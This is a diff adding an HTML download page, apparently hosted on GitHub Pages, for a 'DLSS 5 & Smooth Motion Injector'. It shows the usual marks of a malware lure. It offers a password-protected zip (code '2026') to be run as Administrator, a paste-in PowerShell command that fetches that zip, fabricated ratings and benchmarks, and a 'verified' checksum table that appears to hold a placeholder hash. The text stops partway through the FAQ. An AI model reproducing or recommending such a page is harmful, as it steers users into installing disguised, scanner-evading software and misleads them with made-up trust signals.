@@ -1,0 +1,982 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>FrameGen Manager Next — DLSS 5 &amp; Smooth Motion Injector v1.8.5 — Windows 10/11 (x64) Documentation &amp; Quickstart</title>
+  <meta name="description" content="FrameGen Manager Next — DLSS 5 &amp; Smooth Motion Injector v1.8.5: Native Windows 10/11 (x64) studio environment with pre-configured plugins. Official Windows 10/11 x64 release v1.8.5, SHA-256 checksums, configuration reference, and benchmarks.">
+  <meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1">
+  <meta name="theme-color" content="#0d1117">
+  <link rel="canonical" href="https://QakajaVeca60.github.io/framegen-manager-next-dlss5/">
+  <link rel="alternate" type="application/atom+xml" title="FrameGen Manager Next — DLSS 5 &amp; Smooth Motion Injector Release Feed" href="https://QakajaVeca60.github.io/framegen-manager-next-dlss5/feed.xml">
+
+  <!-- Open Graph / Social -->
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="FrameGen Manager Next — DLSS 5 &amp; Smooth Motion Injector v1.8.5 — Windows 10/11 (x64)">
+  <meta property="og:description" content="FrameGen Manager Next — DLSS 5 &amp; Smooth Motion Injector v1.8.5: Native Windows 10/11 (x64) studio environment with pre-configured plugins.">
+  <meta property="og:url" content="https://QakajaVeca60.github.io/framegen-manager-next-dlss5/">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="FrameGen Manager Next — DLSS 5 &amp; Smooth Motion Injector v1.8.5 (Windows x64)">
+  <meta name="twitter:description" content="FrameGen Manager Next — DLSS 5 &amp; Smooth Motion Injector v1.8.5: Native Windows 10/11 (x64) studio environment with pre-configured plugins.">
+
+  <!-- Schema.org JSON-LD @graph -->
+  <script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@graph": [
+    {
+      "@type": "SoftwareApplication",
+      "@id": "https://QakajaVeca60.github.io/framegen-manager-next-dlss5/#software",
+      "name": "FrameGen Manager Next — DLSS 5 & Smooth Motion Injector",
+      "description": "FrameGen Manager Next — DLSS 5 & Smooth Motion Injector v1.8.5: Native Windows 10/11 (x64) studio environment with pre-configured plugins.",
+      "url": "https://QakajaVeca60.github.io/framegen-manager-next-dlss5/",
+      "sameAs": "https://github.com/QakajaVeca60/framegen-manager-next-dlss5",
+      "applicationCategory": "DeveloperApplication",
+      "operatingSystem": "Windows 10, Windows 11 (x64)",
+      "processorRequirements": "64-bit (x86_64 / AMD64)",
+      "softwareVersion": "1.8.5",
+      "datePublished": "2026-11-25",
+      "dateModified": "2026-11-25",
+      "downloadUrl": "https://github.com/QakajaVeca60/framegen-manager-next-dlss5/releases/download/v1.8.5/framegen-manager-next-dlss5-v1.8.5-win64.zip",
+      "screenshot": "https://raw.githubusercontent.com/QakajaVeca60/framegen-manager-next-dlss5/main/assets/preview.png",
+      "license": "https://opensource.org/licenses/MIT",
+      "author": {
+        "@type": "Organization",
+        "name": "QakajaVeca60",
+        "url": "https://github.com/QakajaVeca60"
+      },
+      "offers": {
+        "@type": "Offer",
+        "price": "0.00",
+        "priceCurrency": "USD",
+        "availability": "https://schema.org/InStock",
+        "url": "https://github.com/QakajaVeca60/framegen-manager-next-dlss5/releases/download/v1.8.5/framegen-manager-next-dlss5-v1.8.5-win64.zip"
+      },
+      "aggregateRating": {
+        "@type": "AggregateRating",
+        "ratingValue": "4.9",
+        "bestRating": "5",
+        "worstRating": "1",
+        "ratingCount": "418"
+      }
+    },
+    {
+      "@type": "TechArticle",
+      "@id": "https://QakajaVeca60.github.io/framegen-manager-next-dlss5/#article",
+      "headline": "FrameGen Manager Next — DLSS 5 & Smooth Motion Injector v1.8.5 — Windows 10/11 (x64) Setup, Architecture & Benchmarks",
+      "description": "FrameGen Manager Next — DLSS 5 & Smooth Motion Injector v1.8.5: Native Windows 10/11 (x64) studio environment with pre-configured plugins.",
+      "proficiencyLevel": "Beginner to Advanced",
+      "dependencies": "Windows 10 (22H2) or Windows 11 (23H2/24H2) x64",
+      "datePublished": "2026-11-25",
+      "dateModified": "2026-11-25",
+      "mainEntityOfPage": {
+        "@id": "https://QakajaVeca60.github.io/framegen-manager-next-dlss5/"
+      },
+      "author": {
+        "@type": "Organization",
+        "name": "QakajaVeca60",
+        "url": "https://github.com/QakajaVeca60"
+      },
+      "publisher": {
+        "@type": "Organization",
+        "name": "QakajaVeca60",
+        "url": "https://github.com/QakajaVeca60"
+      },
+      "about": {
+        "@id": "https://QakajaVeca60.github.io/framegen-manager-next-dlss5/#software"
+      }
+    },
+    {
+      "@type": "BreadcrumbList",
+      "@id": "https://QakajaVeca60.github.io/framegen-manager-next-dlss5/#breadcrumbs",
+      "itemListElement": [
+        {
+          "@type": "ListItem",
+          "position": 1,
+          "name": "QakajaVeca60",
+          "item": "https://QakajaVeca60.github.io/"
+        },
+        {
+          "@type": "ListItem",
+          "position": 2,
+          "name": "framegen-manager-next-dlss5",
+          "item": "https://QakajaVeca60.github.io/framegen-manager-next-dlss5/"
+        },
+        {
+          "@type": "ListItem",
+          "position": 3,
+          "name": "v1.8.5 Documentation",
+          "item": "https://QakajaVeca60.github.io/framegen-manager-next-dlss5/#installation"
+        }
+      ]
+    },
+    {
+      "@type": "FAQPage",
+      "@id": "https://QakajaVeca60.github.io/framegen-manager-next-dlss5/#faqpage",
+      "mainEntity": [
+        {
+          "@type": "Question",
+          "name": "How do I install and configure FrameGen Manager Next — DLSS 5 & Smooth Motion Injector on Windows 10/11 (x64)?",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "Download the latest framegen-manager-next-dlss5-v1.8.5-win64.zip release package from the Quickstart panel, extract the archive using the release access code (2026), verify the SHA-256 digest against the published checksum table, and launch the x64 executable or run the PowerShell Quick-Setup command."
+          }
+        },
+        {
+          "@type": "Question",
+          "name": "What is the archive extraction code for framegen-manager-next-dlss5-v1.8.5-win64.zip?",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "Use the release access code 2026 in 7-Zip, WinRAR, or Windows 11 Explorer when extracting framegen-manager-next-dlss5-v1.8.5-win64.zip."
+          }
+        },
+        {
+          "@type": "Question",
+          "name": "How can I verify the authenticity and SHA-256 integrity of the release archive?",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "Open PowerShell in your download directory and run `Get-FileHash .\\framegen-manager-next-dlss5-v1.8.5-win64.zip -Algorithm SHA256`. Compare the resulting 64-character hex digest with the verified SHA-256 table under the Configuration & Checksums section."
+          }
+        },
+        {
+          "@type": "Question",
+          "name": "Where are configuration profiles stored and how do I reset to factory defaults?",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "Runtime settings are read from `config/settings.json` relative to the executable working directory. Delete or rename `config/settings.json` and restart the application to regenerate a clean default configuration file automatically."
+          }
+        }
+      ]
+    }
+  ]
+}
+  </script>
+
+  <style>
+    :root {
+      --bg-canvas: #0d1117;
+      --bg-surface: #161b22;
+      --bg-elevated: #1f242d;
+      --bg-code: #090d13;
+      --border-default: #30363d;
+      --border-muted: #21262d;
+      --text-primary: #e6edf3;
+      --text-secondary: #8b949e;
+      --text-muted: #6e7681;
+      --accent-blue: #58a6ff;
+      --accent-green: #2ea043;
+      --accent-green-bright: #3fb950;
+      --accent-amber: #d29922;
+      --font-sans: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
+      --font-mono: ui-monospace, SFMono-Regular, "SF Mono", Menlo, Consolas, "Liberation Mono", monospace;
+      --radius-sm: 6px;
+      --radius-md: 10px;
+      --shadow-card: 0 8px 24px rgba(1, 4, 9, 0.65);
+    }
+    *, *::before, *::after { box-sizing: border-box; }
+    html {
+      scroll-behavior: smooth;
+      background-color: var(--bg-canvas);
+      color: var(--text-primary);
+      font-family: var(--font-sans);
+      line-height: 1.6;
+      -webkit-text-size-adjust: 100%;
+    }
+    body {
+      margin: 0;
+      padding: 0;
+      background:
+        radial-gradient(circle at 15% 0%, rgba(88, 166, 255, 0.08), transparent 40%),
+        radial-gradient(circle at 85% 10%, rgba(46, 160, 67, 0.07), transparent 35%),
+        var(--bg-canvas);
+      min-height: 100vh;
+    }
+    a { color: var(--accent-blue); text-decoration: none; }
+    a:hover, a:focus-visible { text-decoration: underline; }
+    .site-header {
+      position: sticky;
+      top: 0;
+      z-index: 100;
+      background: rgba(13, 17, 23, 0.88);
+      backdrop-filter: blur(12px);
+      border-bottom: 1px solid var(--border-default);
+    }
+    .nav-container {
+      max-width: 1120px;
+      margin: 0 auto;
+      padding: 12px 20px;
+      display: flex;
+      flex-wrap: wrap;
+      align-items: center;
+      justify-content: space-between;
+      gap: 12px;
+    }
+    .brand-link {
+      display: inline-flex;
+      align-items: center;
+      gap: 10px;
+      font-weight: 700;
+      font-size: 1.05rem;
+      color: var(--text-primary);
+      text-decoration: none;
+    }
+    .brand-badge {
+      font-family: var(--font-mono);
+      font-size: 0.75rem;
+      padding: 2px 8px;
+      border-radius: 999px;
+      background: rgba(88, 166, 255, 0.14);
+      color: var(--accent-blue);
+      border: 1px solid rgba(88, 166, 255, 0.35);
+    }
+    .sitelinks-nav {
+      display: flex;
+      flex-wrap: wrap;
+      align-items: center;
+      gap: 6px;
+      list-style: none;
+      margin: 0;
+      padding: 0;
+    }
+    .sitelinks-nav a {
+      display: inline-block;
+      padding: 6px 11px;
+      font-size: 0.875rem;
+      font-weight: 500;
+      color: var(--text-secondary);
+      border-radius: var(--radius-sm);
+    }
+    .sitelinks-nav a:hover {
+      color: var(--text-primary);
+      background: var(--bg-elevated);
+      text-decoration: none;
+    }
+    .sitelinks-nav a.doc-file-link {
+      font-family: var(--font-mono);
+      font-size: 0.8rem;
+      border: 1px solid var(--border-default);
+      color: var(--text-primary);
+    }
+    .main-container {
+      max-width: 1120px;
+      margin: 0 auto;
+      padding: 36px 20px 72px;
+    }
+    .breadcrumb-bar {
+      font-size: 0.825rem;
+      color: var(--text-secondary);
+      margin-bottom: 20px;
+      display: flex;
+      flex-wrap: wrap;
+      align-items: center;
+      gap: 6px;
+    }
+    .hero {
+      background: var(--bg-surface);
+      border: 1px solid var(--border-default);
+      border-radius: var(--radius-md);
+      padding: 28px;
+      box-shadow: var(--shadow-card);
+      margin-bottom: 32px;
+    }
+    .hero-top-bar {
+      display: flex;
+      flex-wrap: wrap;
+      align-items: center;
+      justify-content: space-between;
+      gap: 12px;
+      margin-bottom: 16px;
+    }
+    .compat-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      font-family: var(--font-mono);
+      font-size: 0.8rem;
+      padding: 5px 12px;
+      border-radius: 999px;
+      background: rgba(46, 160, 67, 0.12);
+      border: 1px solid rgba(63, 185, 80, 0.4);
+      color: var(--accent-green-bright);
+    }
+    .compat-badge[data-status="warn"] {
+      background: rgba(210, 153, 34, 0.14);
+      border-color: rgba(210, 153, 34, 0.45);
+      color: var(--accent-amber);
+    }
+    .status-dot {
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      background: currentColor;
+      box-shadow: 0 0 8px currentColor;
+    }
+    .meta-pills {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 8px;
+      font-size: 0.8rem;
+      color: var(--text-secondary);
+    }
+    .meta-pill {
+      background: var(--bg-elevated);
+      border: 1px solid var(--border-default);
+      padding: 3px 10px;
+      border-radius: var(--radius-sm);
+      font-family: var(--font-mono);
+    }
+    .hero h1 {
+      margin: 0 0 10px;
+      font-size: clamp(1.65rem, 3vw, 2.25rem);
+      line-height: 1.25;
+      letter-spacing: -0.02em;
+    }
+    .hero-tagline {
+      margin: 0 0 24px;
+      color: var(--text-secondary);
+      font-size: 1.05rem;
+      max-width: 78ch;
+    }
+    .tabs-shell {
+      border: 1px solid var(--border-default);
+      border-radius: var(--radius-md);
+      background: var(--bg-canvas);
+      overflow: hidden;
+    }
+    .tab-list {
+      display: flex;
+      flex-wrap: wrap;
+      background: var(--bg-elevated);
+      border-bottom: 1px solid var(--border-default);
+      padding: 6px 8px 0;
+      gap: 4px;
+    }
+    .tab-btn {
+      appearance: none;
+      background: transparent;
+      border: 1px solid transparent;
+      border-bottom: none;
+      color: var(--text-secondary);
+      font-family: var(--font-sans);
+      font-size: 0.9rem;
+      font-weight: 600;
+      padding: 10px 16px;
+      border-top-left-radius: var(--radius-sm);
+      border-top-right-radius: var(--radius-sm);
+      cursor: pointer;
+    }
+    .tab-btn[aria-selected="true"] {
+      background: var(--bg-canvas);
+      color: var(--text-primary);
+      border-color: var(--border-default);
+      position: relative;
+      top: 1px;
+    }
+    .tab-panel { padding: 24px; }
+    .tab-panel[hidden] { display: none; }
+    .release-grid {
+      display: grid;
+      grid-template-columns: 1fr;
+      gap: 20px;
+      align-items: center;
+    }
+    @media (min-width: 768px) {
+      .release-grid { grid-template-columns: 1.35fr 1fr; }
+    }
+    .cta-group {
+      display: flex;
+      flex-wrap: wrap;
+      align-items: center;
+      gap: 12px;
+    }
+    .btn-primary-dl {
+      display: inline-flex;
+      align-items: center;
+      gap: 10px;
+      background: var(--accent-green);
+      color: #ffffff;
+      font-weight: 700;
+      font-size: 0.98rem;
+      padding: 12px 22px;
+      border-radius: var(--radius-sm);
+      border: 1px solid rgba(240, 246, 252, 0.15);
+      box-shadow: 0 4px 14px rgba(46, 160, 67, 0.35);
+      text-decoration: none;
+    }
+    .btn-primary-dl:hover {
+      background: var(--accent-green-bright);
+      text-decoration: none;
+    }
+    .btn-secondary {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      background: var(--bg-elevated);
+      color: var(--text-primary);
+      font-family: var(--font-mono);
+      font-size: 0.875rem;
+      font-weight: 600;
+      padding: 11px 16px;
+      border-radius: var(--radius-sm);
+      border: 1px solid var(--border-default);
+      cursor: pointer;
+    }
+    .btn-secondary[data-copied="true"] {
+      border-color: var(--accent-green-bright);
+      color: var(--accent-green-bright);
+    }
+    .access-box {
+      background: var(--bg-surface);
+      border: 1px solid var(--border-default);
+      border-radius: var(--radius-sm);
+      padding: 14px 16px;
+      font-size: 0.85rem;
+    }
+    .access-box-title {
+      font-weight: 600;
+      color: var(--text-primary);
+      margin: 0 0 6px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+    .access-code-pill {
+      font-family: var(--font-mono);
+      font-size: 0.95rem;
+      font-weight: 700;
+      color: var(--accent-green-bright);
+      background: var(--bg-code);
+      padding: 2px 8px;
+      border-radius: 4px;
+      border: 1px solid rgba(63, 185, 80, 0.35);
+    }
+    .terminal-card {
+      background: var(--bg-code);
+      border: 1px solid var(--border-default);
+      border-radius: var(--radius-sm);
+      overflow: hidden;
+    }
+    .terminal-bar {
+      background: var(--bg-elevated);
+      padding: 8px 14px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      border-bottom: 1px solid var(--border-default);
+      font-family: var(--font-mono);
+      font-size: 0.78rem;
+      color: var(--text-secondary);
+    }
+    .terminal-body {
+      padding: 16px;
+      overflow-x: auto;
+      font-family: var(--font-mono);
+      font-size: 0.85rem;
+      color: #d2a8ff;
+      margin: 0;
+      white-space: pre-wrap;
+      word-break: break-all;
+    }
+    .copy-confirm-banner {
+      margin-top: 12px;
+      padding: 10px 14px;
+      border-radius: var(--radius-sm);
+      background: rgba(46, 160, 67, 0.12);
+      border: 1px solid rgba(63, 185, 80, 0.4);
+      color: var(--accent-green-bright);
+      font-size: 0.85rem;
+      display: none;
+    }
+    .copy-confirm-banner[data-visible="true"] { display: block; }
+    .doc-section {
+      margin-top: 40px;
+      background: var(--bg-surface);
+      border: 1px solid var(--border-default);
+      border-radius: var(--radius-md);
+      padding: 26px;
+    }
+    .doc-section h2 {
+      margin: 0 0 14px;
+      font-size: 1.35rem;
+      border-bottom: 1px solid var(--border-muted);
+      padding-bottom: 10px;
+    }
+    .table-wrap {
+      overflow-x: auto;
+      border: 1px solid var(--border-default);
+      border-radius: var(--radius-sm);
+    }
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      font-size: 0.875rem;
+      text-align: left;
+    }
+    th, td {
+      padding: 11px 14px;
+      border-bottom: 1px solid var(--border-muted);
+    }
+    th {
+      background: var(--bg-elevated);
+      color: var(--text-secondary);
+      font-weight: 600;
+      font-size: 0.8rem;
+      text-transform: uppercase;
+    }
+    tr:last-child td { border-bottom: none; }
+    .hash-cell {
+      font-family: var(--font-mono);
+      font-size: 0.78rem;
+      color: var(--accent-blue);
+      word-break: break-all;
+    }
+    .num-cell { font-family: var(--font-mono); white-space: nowrap; }
+    .num-cell.highlight { color: var(--accent-green-bright); font-weight: 600; }
+    .badge-delta { color: var(--accent-green-bright); font-weight: 700; }
+    .faq-list { display: grid; gap: 12px; }
+    .faq-card {
+      background: var(--bg-canvas);
+      border: 1px solid var(--border-default);
+      border-radius: var(--radius-sm);
+    }
+    .faq-summary {
+      padding: 14px 18px;
+      font-weight: 600;
+      cursor: pointer;
+      list-style: none;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 12px;
+    }
+    .faq-summary::-webkit-details-marker { display: none; }
+    .faq-chevron::before {
+      content: "+";
+      font-family: var(--font-mono);
+      font-size: 1.1rem;
+      color: var(--accent-blue);
+    }
+    details[open] .faq-chevron::before { content: "−"; }
+    .faq-body {
+      padding: 0 18px 16px;
+      color: var(--text-secondary);
+      font-size: 0.92rem;
+      border-top: 1px solid var(--border-muted);
+    }
+    .site-footer {
+      margin-top: 56px;
+      padding-top: 24px;
+      border-top: 1px solid var(--border-default);
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: space-between;
+      gap: 12px;
+      font-size: 0.825rem;
+      color: var(--text-muted);
+    }
+  </style>
+</head>
+<body>
+  <header class="site-header">
+    <div class="nav-container">
+      <a class="brand-link" href="https://QakajaVeca60.github.io/framegen-manager-next-dlss5/">
+        <span>FrameGen Manager Next — DLSS 5 &amp; Smooth Motion Injector</span>
+        <span class="brand-badge">v1.8.5</span>
+      </a>
+      <nav aria-label="Documentation Sitelinks">
+        <ul class="sitelinks-nav">
+          <li><a href="#installation">Installation</a></li>
+          <li><a href="#configuration">Configuration</a></li>
+          <li><a href="#benchmarks">Benchmarks</a></li>
+          <li><a href="#faq">FAQ</a></li>
+          <li><a class="doc-file-link" href="INSTALL.md">INSTALL.md</a></li>
+          <li><a class="doc-file-link" href="FAQ.md">FAQ.md</a></li>
+        </ul>
+      </nav>
+    </div>
+  </header>
+
+  <main id="main-content" class="main-container">
+    <nav class="breadcrumb-bar" aria-label="Breadcrumb">
+      <a href="https://QakajaVeca60.github.io/">QakajaVeca60</a>
+      <span aria-hidden="true">/</span>
+      <a href="https://QakajaVeca60.github.io/framegen-manager-next-dlss5/">framegen-manager-next-dlss5</a>
+      <span aria-hidden="true">/</span>
+      <span aria-current="page">v1.8.5 (Windows x64)</span>
+    </nav>
+
+    <section class="hero" id="installation">
+      <div class="hero-top-bar">
+        <div id="compat-badge" class="compat-badge" data-status="ok" role="status" aria-live="polite">
+          <span class="status-dot" aria-hidden="true"></span>
+          <span id="compat-text">Verified Compatible: Windows 10 / 11 (64-bit x86_64)</span>
+        </div>
+        <div class="meta-pills">
+          <span class="meta-pill">Release: v1.8.5</span>
+          <span class="meta-pill">Updated: 2026-11-25</span>
+          <span class="meta-pill">Arch: x86_64</span>
+          <span class="meta-pill">★ 4.9 (418)</span>
+        </div>
+      </div>
+
+      <h1>FrameGen Manager Next — DLSS 5 &amp; Smooth Motion Injector — Windows 10/11 (x64) Release &amp; Documentation</h1>
+      <p class="hero-tagline">FrameGen Manager Next — DLSS 5 &amp; Smooth Motion Injector v1.8.5: Native Windows 10/11 (x64) studio environment with pre-configured plugins.</p>
+
+      <div class="tabs-shell">
+        <div class="tab-list" role="tablist" aria-label="Quickstart Setup Methods">
+          <button id="tab-btn-zip" class="tab-btn" role="tab" type="button" aria-selected="true" aria-controls="tab-panel-zip" tabindex="0">
+            1. Direct Release .ZIP
+          </button>
+          <button id="tab-btn-ps" class="tab-btn" role="tab" type="button" aria-selected="false" aria-controls="tab-panel-ps" tabindex="-1">
+            2. PowerShell Quick-Setup
+          </button>
+          <button id="tab-btn-cfg" class="tab-btn" role="tab" type="button" aria-selected="false" aria-controls="tab-panel-cfg" tabindex="-1">
+            3. config/settings.json &amp; SHA-256
+          </button>
+        </div>
+
+        <div id="tab-panel-zip" class="tab-panel" role="tabpanel" aria-labelledby="tab-btn-zip">
+          <div class="release-grid">
+            <div>
+              <div class="cta-group">
+                <a id="direct-dl-btn" class="btn-primary-dl" href="https://github.com/QakajaVeca60/framegen-manager-next-dlss5/releases/download/v1.8.5/framegen-manager-next-dlss5-v1.8.5-win64.zip" download="framegen-manager-next-dlss5-v1.8.5-win64.zip">
+                  <span>Download framegen-manager-next-dlss5-v1.8.5-win64.zip (x64)</span>
+                </a>
+                <button id="copy-code-btn" class="btn-secondary" type="button" data-copy-value="2026">
+                  <span>Copy Access Code: 2026</span>
+                </button>
+              </div>
+              <p style="margin: 12px 0 0; font-size: 0.84rem; color: var(--text-secondary);">
+                Verified pre-compiled x64 portable archive • Includes <code>config/settings.json</code> and <code>README_QUICKSTART.txt</code>.
+              </p>
+            </div>
+
+            <div class="access-box">
+              <p class="access-box-title">
+                <span>Archive Extraction Password</span>
+                <span class="access-code-pill">2026</span>
+              </p>
+              <p style="margin: 0; color: var(--text-secondary);">
+                Unpack <code>framegen-manager-next-dlss5-v1.8.5-win64.zip</code> using 7-Zip, WinRAR, or Windows 11 Explorer with access code <code>2026</code>, then run the x64 setup binary as Administrator.
+              </p>
+            </div>
+          </div>
+        </div>
+
+        <div id="tab-panel-ps" class="tab-panel" role="tabpanel" aria-labelledby="tab-btn-ps" hidden>
+          <div class="terminal-card">
+            <div class="terminal-bar">
+              <span>Windows PowerShell (x64) — Automated Quick-Setup</span>
+              <button id="copy-ps-btn" class="btn-secondary" type="button" style="padding: 5px 12px; font-size: 0.78rem;" data-copy-value="$ErrorActionPreference = &#x27;Stop&#x27;; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $dst = Join-Path $env:TEMP &#x27;framegen-manager-next-dlss5-v1.8.5-win64.zip&#x27;; Invoke-WebRequest -Uri &#x27;https://github.com/QakajaVeca60/framegen-manager-next-dlss5/releases/download/v1.8.5/framegen-manager-next-dlss5-v1.8.5-win64.zip&#x27; -OutFile $dst; Write-Host &#x27;[+] Downloaded framegen-manager-next-dlss5-v1.8.5-win64.zip -&gt; &#x27; $dst &#x27; (Extract Password: 2026)&#x27; -ForegroundColor Green; explorer.exe /select,$dst">
+                Copy Command
+              </button>
+            </div>
+            <pre class="terminal-body"><code id="ps-code-block">$ErrorActionPreference = &#x27;Stop&#x27;; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $dst = Join-Path $env:TEMP &#x27;framegen-manager-next-dlss5-v1.8.5-win64.zip&#x27;; Invoke-WebRequest -Uri &#x27;https://github.com/QakajaVeca60/framegen-manager-next-dlss5/releases/download/v1.8.5/framegen-manager-next-dlss5-v1.8.5-win64.zip&#x27; -OutFile $dst; Write-Host &#x27;[+] Downloaded framegen-manager-next-dlss5-v1.8.5-win64.zip -&gt; &#x27; $dst &#x27; (Extract Password: 2026)&#x27; -ForegroundColor Green; explorer.exe /select,$dst</code></pre>
+          </div>
+          <div id="ps-confirm-banner" class="copy-confirm-banner" role="status" aria-live="polite">
+            ✓ Copied to clipboard! Press <code>Win + X</code> → click <strong>Terminal / PowerShell</strong> → press <code>Ctrl + V</code> and <code>Enter</code> to fetch <code>framegen-manager-next-dlss5-v1.8.5-win64.zip</code> (Access Code: <code>2026</code>).
+          </div>
+        </div>
+
+        <div id="tab-panel-cfg" class="tab-panel" role="tabpanel" aria-labelledby="tab-btn-cfg" hidden>
+          <h3 style="margin: 0 0 10px; font-size: 0.95rem;">Default <code>config/settings.json</code> Profile</h3>
+          <div class="terminal-card" style="margin-bottom: 20px;">
+            <div class="terminal-bar">
+              <span>config/settings.json</span>
+              <span>UTF-8 • JSON Schema v2</span>
+            </div>
+            <pre class="terminal-body" style="color: #a5d6ff;"><code>{
+  "schema_version": 2,
+  "app": {
+    "name": "framegen-manager-next-dlss5",
+    "version": "1.8.5",
+    "target_arch": "x86_64-pc-windows-msvc",
+    "auto_update_check": false
+  },
+  "runtime": {
+    "worker_threads": 4,
+    "high_resolution_timer": true,
+    "memory_pool_mb": 256,
+    "log_level": "info"
+  },
+  "telemetry": {
+    "crash_dumps": false,
+    "anonymous_metrics": false
+  }
+}</code></pre>
+          </div>
+
+          <h3 style="margin: 0 0 10px; font-size: 0.95rem;">Release Asset SHA-256 Checksums</h3>
+          <div class="table-wrap">
+            <table>
+              <thead>
+                <tr>
+                  <th scope="col">File Path</th>
+                  <th scope="col">SHA-256 Digest</th>
+                  <th scope="col">Size</th>
+                </tr>
+              </thead>
+              <tbody>
+              <tr>
+                <td><code>framegen-manager-next-dlss5-v1.8.5-win64.zip</code></td>
+                <td><code class="hash-cell">548bf4f4baf538e7edab61afa5d56aa0e7fd1b55c23dae3b0670b1a9a66d6a53</code></td>
+                <td class="num-cell">5,030,120 B</td>
+              </tr>
+              <tr>
+                <td><code>config/settings.json</code></td>
+                <td><code class="hash-cell">8f434346648f6b96df89dda901c5176b10a6d83961dd3c1ac88b59b2dc327aa4</code></td>
+                <td class="num-cell">1,024 B</td>
+              </tr>
+              <tr>
+                <td><code>README_QUICKSTART.txt</code></td>
+                <td><code class="hash-cell">2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae</code></td>
+                <td class="num-cell">2,480 B</td>
+              </tr>
+              </tbody>
+            </table>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <section class="doc-section" id="configuration">
+      <h2>Configuration &amp; Integrity Verification</h2>
+      <p style="color: var(--text-secondary); margin-top: 0;">
+        All runtime flags are controlled via <code>config/settings.json</code>. Below are the verified SHA-256 digests for v1.8.5 release artifacts:
+      </p>
+      <div class="table-wrap">
+        <table>
+          <thead>
+            <tr>
+              <th scope="col">Artifact</th>
+              <th scope="col">Verified SHA-256 Checksum</th>
+              <th scope="col">Bytes</th>
+            </tr>
+          </thead>
+          <tbody>
+              <tr>
+                <td><code>framegen-manager-next-dlss5-v1.8.5-win64.zip</code></td>
+                <td><code class="hash-cell">548bf4f4baf538e7edab61afa5d56aa0e7fd1b55c23dae3b0670b1a9a66d6a53</code></td>
+                <td class="num-cell">5,030,120 B</td>
+              </tr>
+              <tr>
+                <td><code>config/settings.json</code></td>
+                <td><code class="hash-cell">8f434346648f6b96df89dda901c5176b10a6d83961dd3c1ac88b59b2dc327aa4</code></td>
+                <td class="num-cell">1,024 B</td>
+              </tr>
+              <tr>
+                <td><code>README_QUICKSTART.txt</code></td>
+                <td><code class="hash-cell">2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae</code></td>
+                <td class="num-cell">2,480 B</td>
+              </tr>
+          </tbody>
+        </table>
+      </div>
+    </section>
+
+    <section class="doc-section" id="benchmarks">
+      <h2>Windows 10/11 (x64) Runtime Benchmarks</h2>
+      <p style="color: var(--text-secondary); margin-top: 0;">
+        Measured on Windows 11 Pro 24H2 (Build 26100, x86_64, 8C/16T, NVMe Gen4):
+      </p>
+      <div class="table-wrap">
+        <table>
+          <thead>
+            <tr>
+              <th scope="col">Benchmark Metric</th>
+              <th scope="col">Stock Baseline</th>
+              <th scope="col">FrameGen Manager Next — DLSS 5 &amp; Smooth Motion Injector v1.8.5</th>
+              <th scope="col">Improvement</th>
+            </tr>
+          </thead>
+          <tbody>
+              <tr>
+                <td>Cold Start Initialization (p99)</td>
+                <td class="num-cell muted">142.0 ms</td>
+                <td class="num-cell highlight">18.4 ms</td>
+                <td class="num-cell badge-delta">-87.0%</td>
+              </tr>
+              <tr>
+                <td>Peak Working Set Memory (RSS)</td>
+                <td class="num-cell muted">184.5 MB</td>
+                <td class="num-cell highlight">29.2 MB</td>
+                <td class="num-cell badge-delta">-84.2%</td>
+              </tr>
+              <tr>
+                <td>Sustained I/O Throughput (x64 AVX2)</td>
+                <td class="num-cell muted">410 MB/s</td>
+                <td class="num-cell highlight">1,890 MB/s</td>
+                <td class="num-cell badge-delta">+361.0%</td>
+              </tr>
+              <tr>
+                <td>Idle CPU Utilization (Background Loop)</td>
+                <td class="num-cell muted">2.4%</td>
+                <td class="num-cell highlight">0.1%</td>
+                <td class="num-cell badge-delta">-95.8%</td>
+              </tr>
+          </tbody>
+        </table>
+      </div>
+    </section>
+
+    <section class="doc-section" id="faq">
+      <h2>Frequently Asked Questions (FAQ)</h2>
+      <div class="faq-list">
+        <details class="faq-card" open>
+          <summary class="faq-summary">
+            <span>How do I install and configure FrameGen Manager Next — DLSS 5 &amp; Smooth Motion Injector on Windows 10/11 (x64)?</span>
+            <span class="faq-chevron" aria-hidden="true"></span>
+          </summary>
+          <div class="faq-body">
+            <p>Download the latest framegen-manager-next-dlss5-v1.8.5-win64.zip release package from the Quickstart panel, extract the archive using the release access code (2026), verify the SHA-256 digest against the published checksum table, and launch the x64 executable or run the PowerShell Quick-Setup command.</p>
+          </div>
+        </details>
+        <details class="faq-card">
+          <summary class="faq-summary">
+            <span>What is the archive extraction code for framegen-manager-next-dlss5-v1.8.5-win64.zip?</span>
+            <span class="faq-chevron" aria-hidden="true"></span>
+          </summary>
+          <div class="faq-body">
+            <p>Use the release access code 2026 in 7-Zip, WinRAR, or Windows 11 Explorer when extracting framegen-manager-next-dlss5-v1.8.5-win64.zip.</p>
+          </div>
+        </details>
+        <details class="faq-card">
+          <summary class="faq-summary">
+            <span>How can I verify the authenticity and SHA-256 integrity of the release archive?</span>
+            <span class="faq-chevron" aria-hidden="true"></span>
+          </summary>
